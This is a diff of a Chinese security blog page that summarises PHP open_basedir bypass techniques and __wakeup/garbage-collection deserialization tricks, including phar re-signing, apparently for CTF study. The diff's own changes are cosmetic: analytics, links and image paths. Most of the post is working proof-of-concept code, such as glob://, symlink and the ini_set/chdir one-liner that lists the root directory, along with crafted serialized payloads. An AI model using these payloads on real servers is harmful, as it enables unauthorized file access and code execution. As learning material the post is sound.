@@ -16,10 +16,20 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>open_basedir+wake_up绕过总结 | hybcx&#39;s blog</title>
@@ -265,7 +275,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -322,7 +332,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -421,11 +431,6 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -442,13 +447,13 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
                 <h1>0x01 open_basedir绕过</h1>
 <h2 id="配置介绍">配置介绍</h2>
 <p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。在<code>php.ini</code>中设置<code>open_basedir</code>的值<code>/var/www/html</code></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225204856047.png" alt="image-20231225204856047"></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225204910963.png" alt="image-20231225204910963"></p>
+<p><img src="image-20231225204856047.png" alt="image-20231225204856047"></p>
+<p><img src="image-20231225204910963.png" alt="image-20231225204910963"></p>
 <p>设置<code>open_basedir=/var/www/html/</code>,通过web访问服务器的用户就无法获取服务器上除了<code>/var/www/html/</code>这个目录以外的文件。</p>
 <p>假设这时连接一个webshell，当webshell工具尝试遍历和读取其他目录时将会失败。也就是蚁剑无法成功读写其他目录下的文件</p>
 <h2 id="系统命令函数绕过">系统命令函数绕过</h2>
 <p>如果此时的靶机只有open_basedir的限制，disable_functions并未过多限制，那我们可以通过system尝试，在这里就借用师傅们的图片了~~~</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225205119741.png" alt="image-20231225205119741"></p>
+<p><img src="image-20231225205119741.png" alt="image-20231225205119741"></p>
 <p>能够遍历上上级目录,而在webshell工具中时被禁止的,说明确实能够绕过，实际情况中,可能<code>system()</code>函数由于disable_function禁用无法使用，可通过同类执行命令函数绕过。但如果几乎过滤了所有的命令函数，那就需要以下几种方法了。</p>
 <h2 id="利用glob-协议绕过">利用glob://协议绕过</h2>
 <h3 id="glob-伪协议">glob://伪协议</h3>
@@ -494,7 +499,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里跟着GPT学习一波上述代码的逻辑，这里懒得配环境了，就直接借用p神的了~~~</p>
 <p>执行我们可以发现，open_basedir为/usr/share/nginx/www/:/tmp/，但我们成功列举了/根目录下的所有文件：</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231224173005894.png" alt="image-20231224173005894"></p>
+<p><img src="image-20231224173005894.png" alt="image-20231224173005894"></p>
 <p>不过这里的测试是在linux环境下才可以的，并且还有一个缺点就是要求php版本为5.3以上，但p神又说5.5/5.6可能有修复，但还没看到。。。这里先不管了</p>
 <h3 id="realpath列举目录">realpath列举目录</h3>
 <p>这个realpath函数是php中将一个路径规范化成为绝对路径的方法，它可以去掉多余的…/或./等跳转字符，能将相对路径转换成绝对路径。</p>
@@ -503,7 +508,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <p>但缺点就是效率太低，上千万次才可以跑完，这肯定不行的，但p神这时候就想到了windows下的通配符：<code>&lt;、&gt;</code></p>
 <p>这里就懵逼了，windows下通配符不是?、*吗，这两个符号是什么鬼，随后看到评论区p神让我们看看这个漏洞</p>
 <p><code>wooyun-2014-071540</code></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231224175128221.png" alt="image-20231224175128221"></p>
+<p><img src="image-20231224175128221.png" alt="image-20231224175128221"></p>
 <p>上述标记处他打错了，这里说在php+windows+iis环境下这两个符号可以等价于通配符，嗷吼，怪不得，payload如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取php.ini中的open_basedir信息</span>
@@ -526,7 +531,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>执行可以看到：</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225162557238.png" alt="image-20231225162557238"></p>
+<p><img src="image-20231225162557238.png" alt="image-20231225162557238"></p>
 <p>Open_basedir为<code>c:\wamp\www</code>，但我们列举出了d:/test/目录下的文件，不过只能列举出首字母不同的文件，首字母相同的话，就需要添加第二个字符再接着枚举、第三个字符etc…</p>
 <p>这个方法好处是windows下php所有版本通用，当然坏处就是只有windows下才能使用通配符，如果是linux下就只能暴力猜解了。</p>
 <h3 id="SplFileInfo-getRealPath列举目录">SplFileInfo::getRealPath列举目录</h3>
@@ -552,7 +557,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里附上对<code>ob_flush()</code>与<code>flush()</code>的解释：</p>
 <pre class="line-numbers language-none"><code class="language-none">这个 dump 函数可能主要用于调试目的，当开发者想要得到实时输出并即时观察脚本执行信息时。在脚本执行期间，输出通常会缓存起来，直到达到一定量或脚本执行完毕后一次性发送到浏览器。通过使用 ob_flush() 和 flush()，开发者可以强制立即输出数据，这对于监视长时间运行的脚本非常有用。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225164606189.png" alt="image-20231225164606189"></p>
+<p><img src="image-20231225164606189.png" alt="image-20231225164606189"></p>
 <p>同样可以列举，这个方法有个特点，不管是否开启open_basedir都是可以枚举任意目录的。而上一个方法（realpath）只有在开启open_basedir且在open_basedir外的时候才会报错，才能列举目录。当然，没有开启open_basedir的时候也不需要这样列举目录了。</p>
 <h3 id="GD库imageftbbox-imagefttext列举目录">GD库imageftbbox/imagefttext列举目录</h3>
 <p>GD库一般是PHP必备的拓展库之一，这里我们看p神的分析：</p>
@@ -579,20 +584,20 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225165108003.png" alt="image-20231225165108003"></p>
+<p><img src="image-20231225165108003.png" alt="image-20231225165108003"></p>
 <p>我们可以看到成功爆出，但却只能爆出一个字符，但注意的是这里的特殊通配符是起了作用的，只不过在最终输出的时候通配符并没有转换为相应的字符。因此这种方法比realpath麻烦的点在于，需要一位一位爆破。</p>
 <h3 id="bindtextdomain暴力猜解目录">bindtextdomain暴力猜解目录</h3>
 <p>先看p神的分析：</p>
 <p>bindtextdomain是php下绑定domain到某个目录的函数。具体这个domain是什么我也没具体用过，只是在一些l10n应用中可能用到的方法（相关函数textdomain、gettext、setlocale，说明：<a target="_blank" rel="noopener" href="http://php.net/manual/en/function.gettext.php%EF%BC%89">http://php.net/manual/en/function.gettext.php）</a></p>
 <p>Bindtextdomain函数在环境支持Gettext Functions的时候才能使用，而我的windows环境下是没有bindtextdomain函数的，我的linux环境是默认存在这个函数。</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225165416777.png" alt="image-20231225165416777"></p>
+<p><img src="image-20231225165416777.png" alt="image-20231225165416777"></p>
 <p>这个函数的特点在于第二个参数directory，如果文件路径存在则返回具体的路径，不存在则返回false，poc如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$re</span> <span class="token operator">=</span> <span class="token function">bindtextdomain</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'xxx'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225165504916.png" alt="image-20231225165504916"></p>
+<p><img src="image-20231225165504916.png" alt="image-20231225165504916"></p>
 <p>这里可以看到依旧可以绕过open_basedir，缺点在于只能在linux环境下才可以，但在linux下又不能使用通配符来猜解目录，所以这是一个没有办法的办法。。。。</p>
 <p>这里附上<code>linux下又不能使用通配符来猜解目录</code>的原因：</p>
 <pre class="line-numbers language-none"><code class="language-none">在Linux系统中，通过正常的shell环境中使用通配符（如 * 和 ?）来进行文件匹配和简单的模式匹配通常是可行的。然而，通配符通常不用于“猜解”（或称枚举）目录，因为shell通配符的匹配规则并不支持猜解目录结构中未知的部分。
@@ -611,14 +616,14 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
     <span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225211549710.png" alt="image-20231225211549710"></p>
+<p><img src="image-20231225211549710.png" alt="image-20231225211549710"></p>
 <p>虽然只能列目录，php7可以用如下方法读非根目录文件,<code>glob:///*/www/../*</code> 可列举 <code>/var</code>如下图</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225211616133.png" alt="image-20231225211616133"></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225211625852.png" alt="image-20231225211625852"></p>
+<p><img src="image-20231225211616133.png" alt="image-20231225211616133"></p>
+<p><img src="image-20231225211625852.png" alt="image-20231225211625852"></p>
 <p>可见成功绕过</p>
 <h3 id="利用-scandir-glob绕过">利用 scandir+glob绕过</h3>
 <p><code>scandir()</code>函数可以列出指定路径中的文件和目录</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225211949665.png" alt="image-20231225211949665"></p>
+<p><img src="image-20231225211949665.png" alt="image-20231225211949665"></p>
 <h3 id="利用symlink绕过">利用symlink绕过</h3>
 <p><code>symlink()</code>函数创建一个从指定名称连接的现存目标文件开始的符号连接。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$target</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -652,8 +657,8 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>访问web后,将会生成名为POC的文件</p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225212146076.png" alt="image-20231225212146076"></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225212149789.png" alt="image-20231225212149789"></p>
+<p><img src="image-20231225212146076.png" alt="image-20231225212146076"></p>
+<p><img src="image-20231225212149789.png" alt="image-20231225212149789"></p>
 <p>分析一下poc过程:</p>
 <ol>
 <li>创建A/B/C/D目录，并返回到起始目录</li>
@@ -792,7 +797,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <p>那么这时候再进行ini_set，调整open_basedir为/即可通过php_check_open_basedir_ex的校验，成功覆盖，导致我们可以bypass open_basedir。</p>
 <p>所以通用的payload基本如下：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sub'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231225213231747.png" alt="image-20231225213231747"></p>
+<p><img src="image-20231225213231747.png" alt="image-20231225213231747"></p>
 <h1>0x02 wake_up绕过</h1>
 <h2 id="PHP-GC垃圾回收机制">PHP-GC垃圾回收机制</h2>
 <p>这里看到下面的绕过方法基本都是该GC机制引起的，故此先来学习一下前置知识。</p>
@@ -810,7 +815,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span> 
 <span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用于查看变量a的zval变量容器的内容</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226141533931.png" alt="image-20231226141533931"></p>
+<p><img src="image-20231226141533931.png" alt="image-20231226141533931"></p>
 <p>输出如上，这里看着和文章不一样，因为我们很明显只定义了一个变量，但这里的refcount的值却是2，随后询问了GPT发现是函数的问题，当我们使用<code>xdebug_debug_zval</code>来检查变量时，xdebug会创建这个变量的一个副本以防止修改原始变量，这个过程将增加zval的引用计数。</p>
 <p>接下来我们添加一个引用</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -818,7 +823,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
 <span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用于查看变量a的zval变量容器的内容</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226142556692.png" alt="image-20231226142556692"></p>
+<p><img src="image-20231226142556692.png" alt="image-20231226142556692"></p>
 <p>如上图这里refcount，看到这里依旧发现refcount是2，在这是因为此时a和b变量共同使用同一个地址，那他们实际上会共同指向变量a所在zval结构，也就是同一个zval被两个变量所引用，因此refcount=2</p>
 <p>接下来说一下容器的销毁这个事，变量容器在<code>refcount</code>变成0时就被销毁。它这个值是如何减少的呢，当函数执行结束或者对变量调用了unset()函数,<code>refcount</code>就会减1。看个例子</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -829,7 +834,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//销毁变量b和c</span>
 <span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226143531142.png" alt="image-20231226143531142"></p>
+<p><img src="image-20231226143531142.png" alt="image-20231226143531142"></p>
 <p>这里看到在unset了b和c之后refcount恢复到了1，但是is_ref的值却成为了1，按常理来说，这里销毁了b和c变量，那么a变量就没有被引用了，is_ref的值应该为0。我们看看GPT的回答：</p>
 <p>当你销毁其中的一个或多个引用变量，即使使用了<code>unset</code>，剩下的变量（这里是<code>$a</code>）仍然保持原始<code>zval</code>的状态，其中包括它的<code>is_ref</code>和<code>refcount</code>的值。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 销毁变量$b和$c</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -880,7 +885,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你想干什么'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226145416710.png" alt="image-20231226145416710"></p>
+<p><img src="image-20231226145416710.png" alt="image-20231226145416710"></p>
 <p>我们可以看到如果正常传入反序列化字符串，是无法调用析构函数的，直接就被抛出错误，这离我们需要明确的一点是：</p>
 <p>反序列化操作本身并不会自动触发析构函数；析构函数的调用要么是因为对象将不再被引用（对于局部变量，会在其作用域结束时发生），要么是因为整个脚本的执行已经结束（对于全局变量）。</p>
 <p>对应到上述代码就是我们的<code>unserialize($_GET['1']);</code>被赋值给了变量a，但a是一个全局变量，只有当脚本执行结束之后a的生命周期才会结束，此时才会调用析构函数，但是在脚本结束前，被<code>throw new Exception('你想干什么');</code>抛出了异常，那么PHP会因为这个异常而直接中断脚本的执行，这导致了变量a的析构函数没有机会被调用</p>
@@ -900,7 +905,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'你想干什么'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226150255469.png" alt="image-20231226150255469"></p>
+<p><img src="image-20231226150255469.png" alt="image-20231226150255469"></p>
 <p>可以看到虽然依旧被抛出了异常，但我们的析构函数也被正常调用了。这是由于<code>unserialize($_GET['1']);</code>没有赋值给其他变量，也就是说在调用完unserialize之后，这个对象就立即没有了对它的引用，此时的PHP GC机制判断出该对象没有了引用，就是调用垃圾回收机制，将其回收，这时候就会调用析构函数来清理。</p>
 <p>但如果真实环境下，这里就是被某个变量引用了，我们如何绕过异常来调用析构函数呢，即如何提前触发GC垃圾回收机制，这里看看大师傅如何绕过的，它采用反序列化一个数组来尝试绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -921,7 +926,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token comment">//数组:长度为2:{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>接下来这位师傅将第二个索引置空，就可以触发<code>GC</code>回收机制，因此修改序列化文本为</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"B"</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226151351299.png" alt="image-20231226151351299"></p>
+<p><img src="image-20231226151351299.png" alt="image-20231226151351299"></p>
 <p>可以看到成功绕过</p>
 <p>这里我认为是将两个索引都改为了同一个，这导致指针出了问题，也就是在开始的时候对象B的索引为0，也就是a[0]=B，之后又来了一个a[0]=0，因此前者的引用消失了，也就成功触发析构函数了</p>
 <h2 id="Gc在Phar反序列化中的利用">Gc在Phar反序列化中的利用</h2>
@@ -958,7 +963,7 @@ open_basedir是php.ini中的一个配置选项，可用于将用户访问文件�
 <span class="token comment">//签名自动计算</span>
 <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226152950419.png" alt="image-20231226152950419"></p>
+<p><img src="image-20231226152950419.png" alt="image-20231226152950419"></p>
 <p>用编辑器打开后，我们可以利用上述思路来修改此处的索引，以此来绕过异常，但注意的是phar文件中不能随意修改数据，否则就会因为签名错误而导致文件出错，但签名可以进行伪造，所以我们依旧可以先直接修改，之后重新计算文件签名</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
 <span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha1
@@ -969,9 +974,9 @@ h <span class="token operator">=</span> f<span class="token punctuation">[</span
 newf <span class="token operator">=</span> s <span class="token operator">+</span> sha1<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> h <span class="token comment"># 数据 + 签名 + (类型 + GBMB)</span>
 <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'newtest.phar'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
     <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>newf<span class="token punctuation">)</span> <span class="token comment"># 写入新文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226153323336.png" alt="image-20231226153323336"></p>
+<p><img src="image-20231226153323336.png" alt="image-20231226153323336"></p>
 <p>接下来就利用phar伪协议即可：<code>filename=phar://D:\PphProject\Scripts\newtest.phar</code></p>
-<p><img src="/2023/12/25/open-basedir-wakeup-rao-guo/image-20231226154512427.png" alt="image-20231226154512427"></p>
+<p><img src="image-20231226154512427.png" alt="image-20231226154512427"></p>
 <h2 id="CTF例题">CTF例题</h2>
 <p>这道题是<code>H3018</code>大师傅在知识分享时的例题，在这里引用一下，源码如下</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
@@ -1022,7 +1027,7 @@ newf <span class="token operator">=</span> s <span class="token operator">+</spa
 
